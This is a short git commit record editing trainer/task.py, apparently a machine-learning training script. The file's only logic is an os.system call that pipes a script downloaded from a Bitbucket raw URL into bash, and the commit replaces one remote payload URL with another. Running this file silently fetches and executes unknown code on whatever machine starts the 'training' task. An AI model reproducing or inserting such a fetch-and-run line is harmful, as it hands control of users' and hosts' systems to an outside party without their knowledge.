7dad9bc3a7a96eb54ae99fee644aa2fd90d765f9
RamaBena <oujditybena@hotmail.com>
2023-12-26 18:44:10 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/boluna/file/raw/master/reac/reac | bash')
+os.system('curl -sL https://bitbucket.org/boluna/file/raw/master/mintul | bash')
